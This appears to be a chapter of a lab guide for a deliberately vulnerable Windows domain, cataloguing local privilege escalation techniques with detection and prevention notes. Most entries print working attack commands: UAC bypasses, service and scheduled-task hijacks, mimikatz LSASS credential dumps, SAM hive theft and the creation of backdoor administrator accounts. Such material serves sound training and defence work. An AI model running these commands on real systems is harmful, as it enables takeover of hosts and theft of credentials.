# 05 — Privilege Escalation (PE-001..128)

Local privilege escalation on Windows. Most paths here assume you have *something* (a low-priv shell, a domain user on a workstation, or a service account on a server). The goal is SYSTEM.

Run `winPEAS` and `SharpUp` first — they enumerate 80% of these mechanically.

---

### PE-001 — SeImpersonatePrivilege → Potato suite
**What it is:** any process holding `SeImpersonatePrivilege` can be tricked into authenticating to a local malicious "RPC" listener; the resulting impersonation token is SYSTEM.
**Why it works here:** IIS AppPool / SQL Service run as Network Service or service accounts with SeImpersonate.
**Tools:** `PrintSpoofer`, `GodPotato`, `JuicyPotato`, `SweetPotato`, `RoguePotato`, `RemotePotato0`, `EfsPotato`, `LocalPotato`.
**Steps:**
```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami > C:\Temp\o.txt"
```
**Detection:** Sysmon `1` child process of `w3wp.exe`/`sqlservr.exe` spawning `cmd.exe`/`powershell.exe`; named-pipe creation by service accounts.
**Prevention:** remove `SeImpersonate` from service accounts where possible; run AppPool as Managed Service Account; ASR rules.

---

### PE-002 — SeAssignPrimaryTokenPrivilege
**What it is:** lets you use `CreateProcessAsUserW` with any token — chain with token impersonation for SYSTEM.
**Tools:** `FullPowers`, custom PoC.
**Detection:** Event `4673` for the privilege used by non-system context.
**Prevention:** don't grant; tier services.

---

### PE-003 — SeTcbPrivilege
**What it is:** "act as part of the operating system" — virtually a SYSTEM-equivalent privilege. Trivial escalation.
**Detection:** `4673` for SeTcb.
**Prevention:** never grant outside `LocalSystem`.

---

### PE-004 — SeLoadDriverPrivilege
**What it is:** load a kernel driver. Chain with a signed-but-vulnerable driver (Capcom.sys, HEVD, RTCore64.sys) for kernel SYSTEM.
**Tools:** `Capcom-Rootkit`, `KDU`, `EOPLOAD`, `KDMapper`.
**Detection:** Event `7045`/`6` (kernel-mode load) of unsigned/known-vulnerable drivers; HVCI mitigations.
**Prevention:** enable HVCI; Microsoft Vulnerable Driver Block List; Smart App Control.

---

### PE-005 — SeBackupPrivilege → File Read Bypass
**What it is:** read any file ignoring DACLs; combined with `robocopy /B` or `wbadmin` to extract SAM/SECURITY/NTDS.
**Tools:** `robocopy /B`, `diskshadow`, `secretsdump`.
**Steps:** see CRED-039.
**Detection:** `4673` for SeBackupPrivilege used to access sensitive hives.
**Prevention:** tier Backup Operators; require backup software to use dedicated service accounts.

---

### PE-006 — SeRestorePrivilege → File Write Bypass
**What it is:** counterpart to SeBackup; write any file ignoring DACLs. Plant a payload in `C:\Windows\System32\`.
**Tools:** `robocopy /B`, `xcopy /O`.
**Detection:** Event `4663` writing to protected system folders.
**Prevention:** same as PE-005.

---

### PE-007 — Unquoted Service Path
**What it is:** service binPath `C:\Program Files\Vuln Co\service.exe` (unquoted, with spaces) — Windows tries `C:\Program.exe`, `C:\Program Files\Vuln.exe`, etc., in order. Write any of those = service runs your binary.
**Why it works here:** `VulnService` is deliberately registered unquoted.
**Tools:** `winPEAS`, `wmic service`, `SharpUp`.
**Steps:**
```cmd
wmic service get name,pathname,startname,startmode | findstr /i "auto" | findstr /v /i "C:\"
copy beacon.exe "C:\Program Files\Vuln.exe"
sc start VulnService
```
**Detection:** Sysmon `7045`, file create in suspicious path.
**Prevention:** always quote service binPaths.

---

### PE-008 — Weak Service DACL
**What it is:** ACL on a service allows non-admins `SERVICE_CHANGE_CONFIG`. `sc config <svc> binPath= "cmd /c ..."`, restart, SYSTEM.
**Tools:** `winPEAS`, `accesschk`, `sc config`.
**Steps:**
```cmd
accesschk.exe -uwcqv "Authenticated Users" *
sc config VulnSvc binPath= "cmd /c net user loki P@ss /add"
sc start VulnSvc
```
**Detection:** Event `7040`.
**Prevention:** harden service DACLs; remove `Authenticated Users`/`Users` from change-config rights.

---

### PE-009 — DLL Hijacking
**What it is:** missing DLL in the app's search path → drop a DLL with that name in a writable directory earlier in the search order → loaded into the privileged process.
**Tools:** `Process Monitor` (filter NAME NOT FOUND), `winPEAS`.
**Detection:** Sysmon `7` DLL loaded from unusual path.
**Prevention:** `SafeDllSearchMode=1`; signed-only loading; Smart App Control.

---

### PE-010 — PATH Hijacking
**What it is:** writable directory earlier in `%PATH%` than the resolved program → drop `cmd.exe`/`net.exe` and any admin invocation picks yours.
**Tools:** `winPEAS`, `echo %path%`.
**Detection:** new executables in PATH directories.
**Prevention:** sanitize PATH; no writable dirs before system dirs.

---

### PE-011 — AlwaysInstallElevated
**What it is:** HKLM + HKCU `AlwaysInstallElevated=1` → any MSI runs as SYSTEM.
**Why it works here:** policy set deliberately.
**Tools:** `msfvenom -f msi`, `msiexec /i payload.msi`.
**Steps:**
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i payload.msi
```
**Detection:** Sysmon `1` `msiexec.exe` parented by user shell spawning `cmd.exe`.
**Prevention:** GPO disable `AlwaysInstallElevated`.

---

### PE-012 — UAC Bypass (FodHelper / ComputerDefaults / sdclt)
**What it is:** auto-elevated binaries read user-controlled registry keys to launch helper apps. Plant `cmd` into `HKCU\Software\Classes\ms-settings\Shell\Open\Command` → trigger fodhelper → elevated cmd.
**Tools:** `UACME`, `Invoke-FodhelperUACBypass`.
**Steps:**
```powershell
$rkey = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Force -Path $rkey
Set-ItemProperty -Path $rkey -Name '(default)' -Value 'cmd /c start cmd'
Set-ItemProperty -Path $rkey -Name 'DelegateExecute' -Value ''
Start-Process "C:\Windows\System32\fodhelper.exe"
```
**Detection:** Sysmon `13` HKCU registry write to `ms-settings\shell\open\command`.
**Prevention:** UAC = Always Notify; remove user from local Administrators (medium-IL boundary).

---

### PE-013 — SeDebugPrivilege for Domain Users
**What it is:** `SeDebugPrivilege` allows a process to debug other processes (e.g. read/write process memory, inject threads). If granted to domain users, any low-privilege user can access LSASS or SYSTEM processes to steal tokens, dump credentials, or inject code.
**Why it works here:** Granted to Domain Users or specific domain groups via Local Security Policy / GPO on `coruscant`.
**Tools:** `mimikatz`, `taskmgr`, `procdump`, `whoami`.
**Steps:**
```cmd
whoami /priv
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
procdump.exe -ma lsass.exe lsass.dmp
```
**Detection:** Event ID `4673` (Sensitive Privilege Use) for `SeDebugPrivilege`; Sysmon Event ID `10` (ProcessAccess) targeting `lsass.exe`.
**Prevention:** Restrict `SeDebugPrivilege` strictly to Administrators. Remove any group policies or local settings granting it to non-administrative groups.

---

### PE-014 — SeBackupPrivilege for Backup Operators
**What it is:** `SeBackupPrivilege` grants read-only access to all files on the system, bypassing any file system DACLs. An attacker with this privilege can read sensitive system hives (SAM, SECURITY, SYSTEM) or the Active Directory database (`ntds.dit` on Domain Controllers) to extract passwords/hashes offline.
**Why it works here:** Domain user `svc_darryl` is in the `Warehouse` group (which is granted backup rights) or assigned `SeBackupPrivilege` on Domain Controllers.
**Tools:** `wbadmin`, `diskshadow`, `secretsdump`, `robocopy /B`.
**Steps:**
```cmd
reg save HKLM\SAM C:\Temp\sam.hiv /y
reg save HKLM\SYSTEM C:\Temp\system.hiv /y
robocopy /B C:\Windows\System32\config C:\Temp sam
```
**Detection:** Event ID `4673` for `SeBackupPrivilege`; Event ID `4656`/`4663` targeting the `ntds.dit` or registry hives.
**Prevention:** Do not assign `SeBackupPrivilege` to non-administrators or non-dedicated backup accounts. Restrict membership in the `Backup Operators` group.

---

### PE-015 — Weak Service DACL (svc_dvad_weak)
**What it is:** The DACL of a service (`svc_dvad_weak`) allows non-administrative users (`Authenticated Users` or `Everyone`) to modify the service configuration (`SERVICE_CHANGE_CONFIG`). Attackers can change the service binary path (`binPath`) to execute their own malicious binary as `SYSTEM` upon service restart.
**Why it works here:** `svc_dvad_weak` is created with a permissive DACL on `scarif` and `tatooine`.
**Tools:** `sc.exe`, `accesschk.exe`.
**Steps:**
```cmd
accesschk.exe -uwcqv "Authenticated Users" svc_dvad_weak
sc config svc_dvad_weak binPath= "cmd /c net user evil P@ss123 /add && net localgroup administrators evil /add"
sc start svc_dvad_weak
```
**Detection:** Event ID `7040` (Service configuration change) in the System log; Sysmon Event ID `13` (RegistryEvent) for changes to `HKLM\System\CurrentControlSet\Services\svc_dvad_weak\ImagePath`.
**Prevention:** Harden service DACLs. Restrict configuration change rights (`SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS`) to administrators.

---

### PE-016 — Writable Scheduled-Task Action
**What it is:** A scheduled task running as `SYSTEM` runs an action executable or script located in a directory writable by non-administrative users. Attackers can overwrite the script/executable (e.g. `C:\VulnTasks\sync.bat`), triggering execution of their payload in the elevated context.
**Why it works here:** Scheduled task `CorpSync` runs as `SYSTEM` on tatooine, using script `C:\VulnTasks\sync.bat` which is world-writable.
**Tools:** `icacls`, `schtasks`.
**Steps:**
```cmd
icacls C:\VulnTasks
echo net user evil P@ss123 /add > C:\VulnTasks\sync.bat
echo net localgroup administrators evil /add >> C:\VulnTasks\sync.bat
schtasks /run /tn "CorpSync"
```
**Detection:** Sysmon Event ID `11` (FileCreate) modifying files in `C:\VulnTasks\`; process execution of task child processes under `SYSTEM` executing user-written scripts.
**Prevention:** Apply strict ACLs on directories containing scheduled task actions. Ensure only administrators can write to those paths.

---

### PE-017 — DLL Hijacking (sql01 / MSSQL Binn)
**What it is:** A privileged application/service (like MS SQL Server on `kamino`) loads DLLs from its binary directory. If the directory (e.g. `C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn`) is world-writable, a low-privilege user can plant a malicious DLL (like `MSVCR120.dll` or `version.dll`) which will load and execute as `SYSTEM` when the service starts.
**Why it works here:** The MSSQL `Binn` directory on `kamino` is configured with write permissions for `Everyone`.
**Tools:** `Process Monitor`, `icacls`.
**Steps:**
```cmd
icacls "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn"
copy malicious.dll "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\MSVCR120.dll"
```
**Detection:** Sysmon Event ID `7` (Image Loaded) loading a DLL from a non-standard or user-writable location into a SYSTEM process.
**Prevention:** Secure all program directories. Never grant write access to non-administrators on service binary directories.

---

### PE-018 — Loose SYSVOL Scripts DACL
**What it is:** GPO startup/logon scripts are located in the SYSVOL share. If the DACL on these script directories (e.g., `Machine\Scripts\Startup`) is loosened to allow write/modify permissions to authenticated users, an attacker can modify GPO scripts to run arbitrary code as `SYSTEM` on all computers applying the GPO.
**Why it works here:** Permissive ACLs are applied to GPO startup script directories in SYSVOL on `coruscant`.
**Tools:** `SharpGPOAbuse`, `icacls`.
**Steps:**
```powershell
cd \\empire.local\sysvol\empire.local\Policies\{GPO-GUID}\Machine\Scripts\Startup
echo net user evil P@ss123 /add >> startup.bat
```
**Detection:** Event ID `5136` (Directory Service Object Modified) or file system events on the Domain Controller's SYSVOL share (Event ID `4663`).
**Prevention:** Keep default permissions on the SYSVOL folder and GPO paths. Only Domain Admins/Group Policy Creator Owners should have write access.

---

### PE-019 — SYSTEM-Only Flag Access via SeBackupPrivilege
**What it is:** Critical files (like flags or database files) are restricted to `SYSTEM` and `Administrators` only. However, users with `SeBackupPrivilege` (e.g. Backup Operators) can read these files by using specialized backup read APIs, bypassing all DACLs.
**Why it works here:** A flag `C:\Flags\dc-system-only.txt` is created with SYSTEM/Administrators-only permissions on `coruscant`, and can be read by accounts possessing `SeBackupPrivilege`.
**Tools:** `robocopy /B`, custom backup read scripts (like `sebackup.ps1`).
**Steps:**
```cmd
robocopy /B C:\Flags C:\Temp dc-system-only.txt
type C:\Temp\dc-system-only.txt
```
**Detection:** Event ID `4673` indicating sensitive privilege use for `SeBackupPrivilege`.
**Prevention:** Apply Tiered Administrative access; do not grant `SeBackupPrivilege` to non-Tier-0 accounts on Tier-0 systems (like Domain Controllers).

---

### PE-020 — SeChangeNotifyPrivilege
**What it is:** traverse-check bypass. Not directly an escalation but enables read of folders you can't list. Combined with file content secrets.
**Detection:** difficult.
**Prevention:** least privilege.

---

### PE-021 — SeIncreaseQuotaPrivilege
**What it is:** create new AD object or modify resource quotas. Indirectly useful.
**Detection / Prevention:** rare; restrict.

---

### PE-022 — Scheduled `.job` overwrite
**What it is:** legacy `.job` files (XP-era) — write to `%windir%\Tasks` triggers next run.
**Detection:** Sysmon `11`.
**Prevention:** tighten `%windir%\Tasks` ACL.

---

### PE-023 — Startup folder persistence/escalation
**What it is:** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` writable by Domain Users → next admin logon = SYSTEM exec.
**Detection:** Sysmon `11` file creation.
**Prevention:** ACL hardening on `All Users Startup`.

---

### PE-024 — HiveNightmare / SeriousSAM (CVE-2021-36934)
**What it is:** BUILTIN\Users can read VSS snapshots of `SAM`/`SECURITY`/`SYSTEM`. Read = secretsdump = local admin.
**Tools:** `HiveNightmare`, `vssadmin`.
**Steps:**
```cmd
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM C:\Temp\
```
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
**Detection:** Event `4663` access to shadow-copy SAM by non-admin.
**Prevention:** patch (KB5005033+); `icacls C:\Windows\System32\config\*.* /inheritance:e`.

---

### PE-025 — Token Privilege Helper and Named Pipe Impersonation
**What it is:** The `svc_named_pipe` service creates a named pipe. When a higher-privileged client connects to this pipe, a service account with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` can impersonate the client's token using `ImpersonateNamedPipeClient()`.
**Why it works here:** `token_helper.exe` and `privileges.txt` are placed in `C:\Tools` on `scarif` and `tatooine` to guide privilege abuse.
**Tools:** `PrintSpoofer`, `GodPotato`, `RogueWinRM`.
**Steps:**
```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```
**Detection:** Event ID `4624` (Logon Type `3` or `9` with elevated impersonation); Sysmon Event ID `1` for processes spawned by named pipe potato tools.
**Prevention:** Restrict `SeImpersonatePrivilege` on service accounts. Enable virtual service accounts or managed service accounts with minimized privileges.

---

### PE-026 — SeManageVolumePrivilege + Junctions
**What it is:** combined with junctions → take ownership / write protected paths.
**Tools:** `SeManageVolumeExploit`.
**Detection:** Sysmon `1` for `vds.exe` invoked oddly.
**Prevention:** restrict the privilege.

---

### PE-027 — SeCreateSymbolicLinkPrivilege
**What it is:** create symlinks → redirect privileged file ops to attacker-controlled targets.
**Detection:** Sysmon `15` (file stream).
**Prevention:** privilege normally only granted to admins; keep it that way.

---

### PE-028 — Token Impersonation (SeImpersonatePrivilege)
**What it is:** Accounts running network services (like IIS AppPool, SQL Server) possess `SeImpersonatePrivilege` by default. If compromised, an attacker can coerce the local `SYSTEM` account (via print spooler, EFS, or WinRM) to authenticate to a local socket or pipe, allowing the service account to impersonate `SYSTEM`.
**Why it works here:** `SeImpersonatePrivilege` is granted to local service accounts, and `NoLmHash=0` is set to facilitate credential retrieval.
**Tools:** `GodPotato`, `SweetPotato`, `JuicyPotatoNG`.
**Steps:**
```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
**Detection:** Sysmon Event ID `1` process creation where a service account spawns a command shell; Named pipe creation events matching known Potato pipe names.
**Prevention:** Remove `SeImpersonatePrivilege` from service accounts where possible; restrict service accounts using local security policy.

---

### PE-029 — User-Writable SYSTEM PATH Entry (%TEMP%)
**What it is:** The system `%PATH%` variable defines where Windows searches for executables. If a directory writable by non-administrative users (such as `%TEMP%` or `C:\Users\Public`) is appended to the system `%PATH%`, a low-privilege attacker can drop executables there to shadow or hijack execution of system tools run by admins.
**Why it works here:** `%TEMP%` is appended to the system `%PATH%` on `scarif` and `tatooine`.
**Tools:** `echo %PATH%`, `icacls`.
**Steps:**
```cmd
copy payload.exe C:\Windows\Temp\taskkill.exe
```
**Detection:** Sysmon Event ID `11` (FileCreate) inside temporary/writable directories for executable files; unexpected parent-child process chains.
**Prevention:** Clean and sanitize the system `%PATH%`. Ensure all directories in the system `%PATH%` are read-only for non-administrators.

---

### PE-030 — Service binary replacement
**What it is:** PE-008/PE-015 variant — focuses on file write rather than ACL change.

---

### PE-031 — Follina (CVE-2022-30190)
**What it is:** MSDT protocol handler in a Word doc spawns ms-msdt → arbitrary code in user context.
**Tools:** msdt.dll variant or `mspaint`-style PoC.
**Detection:** Sysmon `1` `msdt.exe` child of `winword.exe`.
**Prevention:** patch June 2022; disable MSDT URL protocol (`reg delete HKCR\ms-msdt`).

---

### PE-032 — WordPad RCE (CVE-2023-21716)
**What it is:** RTF parser heap corruption.
**Tools:** PoC RTF.
**Detection:** Sysmon `1` `wordpad.exe` spawning unusual children.
**Prevention:** patch; remove WordPad (deprecated Windows 11 23H2+).

---

### PE-033 — CLFS EoP (CVE-2023-28252)
**What it is:** CLFS driver bug exploited in the wild by ransomware groups.
**Tools:** public PoC.
**Detection:** EDR signature.
**Prevention:** patch April 2023 cumulative.

---

### PE-034 — AFD.sys (CVE-2023-36745)
**What it is:** Ancillary Function Driver kernel LPE.
**Prevention:** patch.

---

### PE-035 — TrustedInstaller LPE (CVE-2023-29360)
**Prevention:** patch.

---

### PE-036 — Windows LPEs 2024 (CVE-2024-2067x)
**Prevention:** patch.

---

### PE-037 — CSC Service LPE (CVE-2024-26229)
**Prevention:** patch.

---

### PE-038 — DWM Core Library LPE (CVE-2024-30051)
**Prevention:** patch.

---

### PE-039 — TCP/IP IPv6 (CVE-2024-38063)
**What it is:** RCE in IPv6 packet processing; can be chained to LPE.
**Prevention:** patch August 2024; disable IPv6 if unused.

---

### PE-040 — 2025 LPE placeholder
Track Patch Tuesday.

---

### PE-041 — Modifiable Service Path Folder
**What it is:** Service binary lives in a folder you can write to → drop DLL/exe.
**Detection / Prevention:** PE-008.

---

### PE-042 — Modifiable Service Registry Key
**What it is:** `ImagePath` registry value writable → point to your binary.
**Detection:** Event `4657` registry value change.
**Prevention:** lock down service registry keys.

---

### PE-043 — StorSvc LOLBAS
**What it is:** Storage Service abuse for impersonation. PE-001 variant.

---

### PE-044 — CDPSvc abuse
**What it is:** Connected Devices Platform Service runs as SYSTEM; named-pipe abuse.
**Tools:** `CDPSvc-PoC`.
**Detection:** Sysmon `1` from `svchost.exe -k LocalService`.
**Prevention:** disable CDPSvc if unused.

---

### PE-045 — Perfmon Help Key
**What it is:** old trick — F1 on a privileged perfmon spawns help in user context, which can pivot.
**Mostly obsolete on modern Windows.**

---

### PE-046 — Point-and-Print EoP (CVE-2022-38047)
**Prevention:** patch; `RestrictDriverInstallationToAdministrators=1`.

---

### PE-047 — CVE-2022-446xx LPEs
**Prevention:** patch.

---

### PE-048 — Kerberos S4U2Self LPE (CVE-2022-33647)
**What it is:** S4U2Self over-permissive — service can S4U for any user, get TGS, escalate.
**Prevention:** patch.

---

### PE-049 — Vulnerable Signed Driver (RTCore64)
**What it is:** Bring-your-own-driver. Load `RTCore64.sys` (MSI Afterburner) — it has kernel R/W primitives via IOCTL → patch token / disable callbacks.
**Tools:** `KDU`, `EOPLOAD`, `RealBlindingEDR`.
**Detection:** unsigned-driver-load events; HVCI; Microsoft Vulnerable Driver Block List.
**Prevention:** enable Microsoft Vulnerable Driver Block List; HVCI/VBS.

---

### PE-050 — MSI Repair Mode
**What it is:** `msiexec /fa` repair → custom action runs as SYSTEM → spawn cmd.
**Tools:** `msiexec /fa`, custom MSI.
**Detection:** Sysmon `1` `msiexec.exe` spawning `cmd.exe`.
**Prevention:** restrict who can repair MSIs; AppLocker.

---

### PE-051 — KrbRelayUp
See LAT-026.

---

### PE-052 — Potato Suite (consolidated)
See PE-001.

---

### PE-053 — CertPotato (ADCS-based SYSTEM via S4U)
**What it is:** service account with SeImpersonate + ADCS reachable → request machine cert → cert auth → S4U → SYSTEM. ADCS variant of GodPotato.
**Tools:** `CertPotato.exe`.
**Detection:** ADCS Event `4886` with machine cert request from service account; Sysmon LSASS access.
**Prevention:** restrict Machine template enrollment; PE-001 mitigations.

---

### PE-054 — NetExec local-auth admin sweep
**What it is:** LAPS not deployed → same local admin password reused (golden image). `nxc smb` with `--local-auth -H hash` lights up every host.
**Tools:** `netexec`.
**Steps:**
```bash
nxc smb 10.10.0.0/24 -u Administrator -H :31d6... --local-auth
```
**Detection:** 4624 Logon Type 3 with local Administrator across many hosts.
**Prevention:** LAPS; unique passwords per host.

---

### PE-055 — 2025 LPE placeholder
Track Patch Tuesday.

---

### PE-056 — UAC Bypass via WSReset/DiskCleanup/EventViewer/Cmstp
**What it is:** auto-elevated binaries with user-controllable lookups → registry hijack → elevated cmd.
**Tools:** `UACME`.
**Detection:** Sysmon `13`/`1` for hijack key + spawn.
**Prevention:** UAC = Always Notify; CCG.

---

### PE-057 — Server Operators → SYSTEM on DC
**What it is:** members of Server Operators on a DC can `sc.exe config` any service → next start = SYSTEM. The classic "tier-0-by-accident" group.
**Why it works here:** `nick.fury` in Server Operators on coruscant.
**Steps:**
```cmd
sc \\coruscant config NTDS binPath= "cmd /c net user backdoor P@ss /add /domain"
sc \\coruscant stop NTDS
sc \\coruscant start NTDS
```
**Detection:** Event `7040` on DC.
**Prevention:** empty Server Operators on every DC.

---

### PE-058 — Print Operators → SYSTEM on DC
**What it is:** Print Operators can install print drivers → driver = DLL → SYSTEM on DC.
**Prevention:** empty Print Operators on DCs.

---

### PE-059 — Backup Operators on DC → NTDS.dit theft
See CRED-007/CRED-039.

---

### PE-060 — TrustedInstaller → SYSTEM (Tier-0 boundary)
**What it is:** admin can `psexec -i -s -d` from TrustedInstaller token to cross the tier-0 boundary on the local machine (modify protected system files).
**Tools:** `psexec64 -s -i`, mimikatz `token::elevate`.
**Detection:** unusual TrustedInstaller-launched processes (Sysmon `1`).
**Prevention:** no practical fix — admin is admin. Tier-0 isolation.

---

### PE-061 — Auto-Run Registry Entry with World-Writable Binary Path
**What it is:** An auto-run registry key (e.g. under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`) points to a binary in a world-writable directory (like `C:\Tools`). Any local user can replace this binary with a malicious payload, which will execute under the context of any user (including administrators) logging into the system.
**Why it works here:** `DVADAutorun` points to a world-writable tools directory target.
**Tools:** `reg query`, `icacls`.
**Steps:**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
copy payload.exe C:\Tools\autorun.exe
```
**Detection:** Sysmon Event ID `13` (RegistryEvent) modifying `CurrentVersion\Run` values; Sysmon Event ID `11` (FileCreate) modifying the binary.
**Prevention:** Ensure all applications launched via auto-run reside in write-protected directories (like `C:\Program Files`).

---

### PE-062 — Print Processor DLL Path (World-Writable)
**What it is:** Print processors are loaded by the Spooler service (`spoolsv.exe`) which runs as `SYSTEM`. If the print processor directory or registry entry is writable by non-admins, an attacker can register or drop a malicious print processor DLL to execute code as `SYSTEM`.
**Why it works here:** The print processor folder or registry key has loose permissions.
**Tools:** `reg add`, `sc`.
**Steps:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProcessor" /v Driver /t REG_SZ /d "evil_processor.dll" /f
sc stop spooler && sc start spooler
```
**Detection:** Sysmon Event ID `7` (Image Loaded) loading print processor DLLs from unexpected paths; Event ID `13` registry modification under `Control\Print`.
**Prevention:** Limit print configuration rights. Ensure the spooler environments folder is strictly write-protected.

---

### PE-063 — LSA Notification Package (World-Writable DLL)
**What it is:** LSA notification packages are DLLs loaded by the Local Security Authority Subsystem Service (`lsass.exe`) at startup. They have access to plaintext passwords when users authenticate. If an attacker has write access to the registry key or the folder where LSA packages are stored, they can register a malicious package (`dvad_notify`) to escalate privileges and dump credentials.
**Why it works here:** `dvad_notify` is added to LSA Notification Packages in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.
**Tools:** `reg query`, `copy`.
**Steps:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages"
copy dvad_notify.dll C:\Windows\System32\
```
**Detection:** Event ID `4624` / `4611` (Trusted Logon Process Registered); Sysmon Event ID `7` (`lsass.exe` loading unsigned notification DLLs).
**Prevention:** Only allow signed LSA plugins; enable LSA Protection (`RunAsPPL=1`).

---

### PE-064 — Security Support Provider (Custom SSP)
**What it is:** Security Support Providers (SSPs) are DLLs loaded by LSA. An attacker with administrative privileges or write access to the registry can add a custom SSP DLL to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` to capture plaintext credentials during user logon.
**Why it works here:** A custom SSP configuration is permitted or registered.
**Tools:** `reg add`, `mimikatz`.
**Steps:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "mimilib\0" /f
```
**Detection:** Sysmon Event ID `7` (`lsass.exe` loading an unusual DLL); Registry modifications under `Lsa\Security Packages`.
**Prevention:** Turn on LSA Protection (`RunAsPPL`); restrict registry write access to LSA keys.

---

### PE-065 — MachineKeys Directory World-Readable (DPAPI)
**What it is:** The `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys` directory stores pair keys for the local machine. If the DACL is overly permissive (world-readable), local users can read private keys used by services (IIS, SQL, VPN), which allows them to decrypt DPAPI-protected secrets or impersonate local services.
**Why it works here:** The MachineKeys directory is configured to be world-readable.
**Tools:** `icacls`, `mimikatz`.
**Steps:**
```cmd
icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
```
**Detection:** File access auditing on `MachineKeys` folder; unexpected read events by non-administrative users.
**Prevention:** Keep default system permissions on Crypto directories. Restrict read access to SYSTEM and Administrators.

---

### PE-066 — Cached Credentials in DPAPI User Master Key
**What it is:** DPAPI (Data Protection API) encrypts secrets using user master keys. If a user's master key is compromised (or cached credential keys are extracted from registry/memory), an attacker can decrypt cached browser passwords, credentials stored in Credential Manager, or Outlook passwords.
**Why it works here:** Cached credentials or weak master keys are stored.
**Tools:** `mimikatz`.
**Steps:**
```cmd
mimikatz "privilege::debug" "dpapi::credentials" exit
```
**Detection:** Access to `AppData\Roaming\Microsoft\Protect\` directories by unusual processes.
**Prevention:** Enable Credential Guard; restrict access to LSASS memory where master keys are cached.

---

### PE-067 — CredentialGuard Disabled
**What it is:** Credential Guard uses virtualization-based security (VBS) to isolate LSASS secrets (such as NTLM password hashes and Kerberos Ticket Granting Tickets) in a secure container. If disabled, these secrets remain in the memory of the user-mode `lsass.exe` process and can be extracted.
**Why it works here:** `EnableVirtualizationBasedSecurity` and `LsaCfgFlags` are explicitly set to `0` to disable Credential Guard in this lab.
**Tools:** `reg query`, `mimikatz`.
**Steps:**
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```
**Detection:** Event ID `4624` (LSA isolation checks); Group Policy compliance checks.
**Prevention:** Deploy VBS and enable Credential Guard via GPO (`Turn On Virtualization Based Security`).

---

### PE-068 — Secure Boot Disabled (CSM mode — boot-level attack)
**What it is:** Secure Boot ensures that only trusted, signed firmware and boot loaders can execute. If disabled (or Compatibility Support Module / CSM mode is enabled), an attacker with physical or local system access can install a malicious bootloader (bootkit) to patch the kernel and bypass OS security controls at boot.
**Why it works here:** Secure Boot is disabled in firmware configuration.
**Tools:** `Confirm-SecureBootUEFI` (PowerShell).
**Steps:**
```powershell
Confirm-SecureBootUEFI
```
**Detection:** Firmware signature validation failures; modified EFI partition files.
**Prevention:** Enable UEFI Secure Boot in system BIOS/UEFI settings and disable CSM.

---

### PE-069 — BitLocker Not Enabled (Cold Boot / Hibernation Attack)
**What it is:** Without full disk encryption (BitLocker), the storage media is unprotected when powered off. An attacker with physical access (or VM disk access) can read/write directly to the disk, extract the SAM database, alter system files, or perform cold boot/hibernation file extraction to steal keys.
**Why it works here:** BitLocker is disabled on VM system drives.
**Tools:** `manage-bde`, VM disk mount.
**Steps:**
```powershell
manage-bde -status
```
**Detection:** Physical device tamper indicators; unauthorized mounting of storage media.
**Prevention:** Force BitLocker encryption on all operating system and data drives.

---

### PE-070 — SAM/SYSTEM Registry Backup Accessible
**What it is:** Periodic registry backups of SAM, SECURITY, and SYSTEM hives are created. If these backups are stored in a world-readable directory (e.g. `C:\Tools\backup\`), any local user can copy them and decrypt local account password hashes.
**Why it works here:** Registry hives SAM and SYSTEM are saved in `C:\Tools\backup\` with permissive read permissions.
**Tools:** `secretsdump`, `copy`.
**Steps:**
```cmd
copy C:\Tools\backup\sam.hiv C:\Temp\
copy C:\Tools\backup\system.hiv C:\Temp\
impacket-secretsdump -sam C:\Temp\sam.hiv -system C:\Temp\system.hiv LOCAL
```
**Detection:** Sysmon Event ID `11` (FileCreate) saving registry hives to world-readable directories; file access logs.
**Prevention:** Restrict backup paths. Do not save registry hives to shared folders or directories accessible by non-administrators.

---

### PE-081..100 — Secedit Privilege Grants / Token Privilege Abuse Surfaces
**What it is:** To simulate privilege escalation paths, various user accounts and local groups are granted powerful token privileges via local policy security databases (`secedit`). These privileges (such as `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeRestorePrivilege`, and `SeLoadDriverPrivilege`) enable direct escalation to `SYSTEM`.
**Why it works here:** Secedit templates configure these assignments across Windows hosts in the lab.
**Tools:** `secedit`, `whoami /priv`, `PrintSpoofer`, `GodPotato`.
**Steps:**
```cmd
whoami /priv
secedit /export /cfg C:\Temp\gp.inf /areas USER_RIGHTS
```
**Detection:** Event ID `4704` (User Right Assigned); Event ID `4673` (Sensitive Privilege Use).
**Prevention:** Regularly audit User Rights Assignments. Revert any unauthorized local policy overrides and centralize privileges via domain Group Policies.

---

### PE-101 — Vulnerable Kernel Driver Loading
